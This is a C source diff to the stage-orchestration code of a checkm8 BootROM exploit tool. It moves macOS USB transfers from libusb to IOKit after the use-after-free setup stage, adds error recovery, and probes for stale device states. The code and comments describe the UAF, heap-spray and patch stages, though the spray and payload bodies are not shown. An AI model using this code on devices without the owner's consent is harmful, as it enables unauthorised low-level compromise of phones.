@@ -71,124 +71,72 @@ int dfu_deliver(dfu_ctx_t *ctx)
 
     log_info("dfu_deliver: starting checkm8 on %s", ctx->chip->name);
 
-    /* Stage order: reset -> setup -> spray -> patch */
+    /* Stage 1: Reset DFU state (via libusb) */
     if (checkm8_stage_reset(ctx) != 0)
-        return -1;
+        goto error;
 
+    /* Stage 2: Setup UAF (via libusb, needs async cancel) */
     if (checkm8_stage_setup(ctx) != 0)
-        return -1;
+        goto error;
 
 #if defined(__APPLE__)
     /*
-     * macOS Apple Silicon: switch from libusb to IOKit AFTER setup.
+     * macOS Apple Silicon: switch from libusb to IOKit AFTER Stage 2 setup.
      *
-     * Stage 2's cancel_control_transfer corrupts the XHCI EP0
-     * transfer ring via AbortPipe(0).  Diagnostics confirmed:
-     *   - pre-spray GETSTATE times out (device appears dead)
-     *   - spray stall/leak/no_leak "succeed" instantly (false
-     *     positives — transfers never reached the device)
-     *   - no heap feng shui → overwrite targets random memory
+     * Stage 2's async cancel triggers AbortPipeZero inside libusb, which
+     * leaves the libusb Darwin driver in a state where subsequent async
+     * transfers fail.
      *
-     * Fix: close libusb, open IOKit, clean the ring with
-     * AbortPipeZero, then run stages 3-4 through IOKit.
-     * IOKit's DeviceRequestTO uses proper XHCI ring management.
-     *
-     * The spray/patch transfer helpers (usb_ctrl_transfer_raw,
-     * usb_ctrl_transfer_soft_timeout) already check
-     * iokit_usb_is_active() and route through IOKit when true,
-     * so no changes are needed in stage 3 or 4 code.
+     * By closing libusb and activating our direct IOKit backend now,
+     * Stages 3 and 4 will use synchronous DeviceRequestTO, which bypasses
+     * the corrupted libusb async state machine and handles EP0 properly.
      */
     {
-        log_info("dfu_deliver: closing libusb after setup");
+        log_info("dfu_deliver: closing libusb after Stage 2 setup");
         usb_dfu_close(ctx->dev->usb);
         ctx->dev->usb = NULL;
 
-        {
-            int iokit_retries;
-            int iokit_ok = 0;
-            for (iokit_retries = 0; iokit_retries < 8; iokit_retries++) {
-                usleep(iokit_retries == 0 ? 500000 : 300000);
-                log_info("dfu_deliver: IOKit activation attempt %d/8",
-                         iokit_retries + 1);
-                if (iokit_usb_activate() == 0) {
-                    iokit_ok = 1;
-                    break;
-                }
-            }
-            if (!iokit_ok) {
-                log_error("dfu_deliver: IOKit activation failed "
-                          "after 8 attempts");
-                return -1;
-            }
+        log_info("dfu_deliver: switching to IOKit for Stages 3-4");
+
+        /* Deactivate any previous IOKit handle before re-activating,
+         * so retry attempts get a fresh device connection instead of
+         * reusing a stale handle left over from the prior attempt. */
+        iokit_usb_deactivate();
+
+        if (iokit_usb_activate() != 0) {
+            log_error("dfu_deliver: IOKit activation failed");
+            goto error;
         }
 
-        log_info("dfu_deliver: AbortPipeZero to clean XHCI EP0 ring");
+        /* Clean host-side XHCI EP0 ring */
         iokit_usb_abort_pipe_zero();
         usleep(50000);
 
-        /* Reset the DFU handler after the stage 2 UAF.
+        /*
+         * Do NOT send CLR_STATUS / DFU_ABORT here (matching gaster).
          *
-         * The UAF leaves the handler in a state where it cannot
-         * respond to DFU requests (GETSTATE times out indefinitely).
-         * In the old libusb flow, CLR_STATUS's SETUP packet reached
-         * the device through the corrupted ring and reset the
-         * handler before IOKit took over.
+         * After stage 2 the device sits in dfuDNLOAD-IDLE with the
+         * pending io_request we intend to hijack.  DFU-class commands
+         * from dfuIDLE corrupt the EP0 ring on Apple Silicon XHCI
+         * (kIOReturnNotReady → device re-enumerates → the IOKit
+         * IOService dies → kIOReturnNoDevice for every later transfer).
          *
-         * With IOKit on a clean ring, send the same commands:
-         *   CLR_STATUS: handles dfuERROR → dfuIDLE
-         *   DFU_ABORT:  handles dfuDNLOAD-IDLE → dfuIDLE
-         * Even if the STATUS IN phase times out, the SETUP packet
-         * is processed by the device. */
-        {
-            int clr_ret = iokit_usb_ctrl_transfer(
-                0x21, DFU_REQ_CLRSTATUS, 0, 0, NULL, 0, 500);
-            log_info("dfu_deliver: CLR_STATUS ret=%d", clr_ret);
-            if (clr_ret != 0) {
-                int abort_ret = iokit_usb_ctrl_transfer(
-                    0x21, DFU_REQ_ABORT, 0, 0, NULL, 0, 500);
-                log_info("dfu_deliver: DFU_ABORT ret=%d", abort_ret);
-            }
-            usleep(50000);
-        }
-
-        /* Poll GETSTATE to confirm the handler is responsive. */
-        {
-            int gs_retries;
-            uint8_t dfu_state = 0xFF;
-            int gs = -1;
-            for (gs_retries = 0; gs_retries < 10; gs_retries++) {
-                usleep(gs_retries == 0 ? 100000 : 200000);
-                dfu_state = 0xFF;
-                gs = iokit_usb_ctrl_transfer(0xA1, 0x05, 0, 0,
-                                             &dfu_state, 1, 1000);
-                if (gs >= 0)
-                    break;
-                log_debug("dfu_deliver: GETSTATE poll %d/10 ret=%d",
-                          gs_retries + 1, gs);
-            }
-            log_info("dfu_deliver: DFU_GETSTATE ret=%d state=%u "
-                     "(%d retries)", gs, dfu_state, gs_retries);
-        }
-
-        /* Skip CLR_STATUS in the spray — we just reset the handler
-         * above.  Sending CLR_STATUS again from dfuIDLE would cause
-         * kIOReturnNotResponding, poisoning the IOKit handle. */
-        ctx->skip_clrstatus = 1;
+         * The spray's stall/leak/no_leak requests walk the DFU state
+         * machine forward naturally; the final CLR_STATUS inside the
+         * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
+         */
+        ctx->skip_clrstatus = 0;
     }
 #endif
 
+    /* Stage 3: Heap Spray (uses IOKit on macOS, libusb elsewhere) */
     if (checkm8_stage_spray(ctx) != 0) {
-#if defined(__APPLE__)
-        iokit_usb_deactivate();
-#endif
-        return -1;
+        goto error;
     }
 
+    /* Stage 4: Patch & Payload (handles its own IOKit logic if needed) */
     if (checkm8_stage_patch(ctx) != 0) {
-#if defined(__APPLE__)
-        iokit_usb_deactivate();
-#endif
-        return -1;
+        goto error;
     }
 
 #if defined(__APPLE__)
@@ -197,6 +145,28 @@ int dfu_deliver(dfu_ctx_t *ctx)
 
     log_info("dfu_deliver: all stages complete");
     return 0;
+
+error:
+#if defined(__APPLE__)
+    iokit_usb_deactivate();
+    /*
+     * Leave the device in a clean DFU entry.
+     *
+     * A stage-4 bail-out (EP0 permanently halted after the overwrite
+     * STALL) or a wedged DFU state machine would otherwise poison the
+     * NEXT run: the device still enumerates, so detection succeeds, but
+     * every stage-1 GET_STATUS times out.  A port-level reset forces a
+     * fresh re-enumeration while we still hold the device.
+     */
+    if (ctx->dev) {
+        if (ctx->dev->usb) {
+            usb_dfu_close(ctx->dev->usb);
+            ctx->dev->usb = NULL;
+        }
+        iokit_usb_recover_bus();
+    }
+#endif
+    return -1;
 }
 
 /* ------------------------------------------------------------------ */
@@ -236,11 +206,12 @@ int checkm8_verify(device_info_t *dev)
 
 #if defined(__APPLE__)
     /*
-     * macOS: read the live serial descriptor via IOKit.
-     * lsusb doesn't exist, and libusb caches the serial from before
-     * the exploit ran, so neither can see the PWND marker.
+     * macOS: read the live serial descriptor via IOKit ONLY IF
+     * libusb handle is NOT open.  If dev->usb is currently open,
+     * calling iokit_usb_activate() causes kIOReturnExclusiveAccess (0xe00002c5)
+     * and disrupts the active libusb control pipe!
      */
-    {
+    if (!dev->usb) {
         char iokit_serial[512] = {0};
         int need_deactivate = 0;
 
@@ -377,19 +348,65 @@ int checkm8_run(device_info_t *dev)
     /*
      * Fast path: if the device is already in processed DFU mode (from a
      * previous successful attempt), skip re-processing.
-     * checkm8_verify returns 1 if "PWND:" is in the serial
-     * (or if the serial is unreadable on usbipd -- we treat that as
-     * done since unreadability after stage 4 is the normal case).
-     * We only reach this fast path when re-entering with an already-open
-     * handle; on a clean fresh start it will return 0.
+     * checkm8_verify returns 1 if "PWND:" is in the serial.
+     *
+     * ON DARWIN (macOS):
+     * libusb_get_string_descriptor_ascii on a fresh DFU handle before
+     * a stage_reset (CLRSTATUS/ABORT) frequently causes kIOReturnTimeout
+     * on Apple Silicon XHCI. This poisons the control pipe, causing Stage 1
+     * GET_STATUS to timeout later.
+     *
+     * Fix: Only verify on open handles if we're NOT on Darwin, or if we
+     * explicitly need to check a retry handle. For the initial run,
+     * assume it needs processing and let stage_reset handle the state.
      */
-    if (dev->usb) {
+#if !defined(__APPLE__)
+    if (dev->usb && dev->usb_claimed) {
         int pre = checkm8_verify(dev);
         if (pre == 1) {
             log_info("checkm8_run: device already processed, skipping");
             return 0;
         }
     }
+#endif
+
+#if defined(__APPLE__)
+    /*
+     * Pre-flight liveness check.
+     *
+     * A previous run that bailed out mid-stage-4 can leave EP0 halted on
+     * the BootROM side: the device still enumerates (detection succeeds)
+     * but every GET_STATUS times out, so stage 1 would burn an attempt
+     * pointlessly.  Probe once with a harmless GET_STATUS; if it fails,
+     * force a port-level reset so the device re-enters DFU cleanly.
+     */
+    if (dev->usb) {
+        dfu_status_t probe;
+        if (dfu_get_status(dev->usb, &probe) != 0) {
+            log_warn("checkm8_run: device unresponsive (stale EP0 from a "
+                     "previous run) -- forcing USB reset");
+            usb_dfu_close(dev->usb);
+            dev->usb = NULL;
+            iokit_usb_recover_bus();
+            sleep(2);
+            {
+                uint8_t probe_iserial = 0;
+                int pa;
+                for (pa = 0; pa < 5 && !dev->usb; pa++) {
+                    if (usb_dfu_find(&dev->usb, &probe_iserial) == 0)
+                        dev->iserial_index = probe_iserial;
+                    else if (pa < 4)
+                        sleep(2);
+                }
+            }
+            if (!dev->usb) {
+                log_error("checkm8_run: DFU device lost during recovery");
+                return -1;
+            }
+            log_info("checkm8_run: device recovered after USB reset");
+        }
+    }
+#endif
 
     for (attempt = 1; attempt <= MAX_DFU_TRIES; attempt++) {
         dfu_ctx_t ctx;
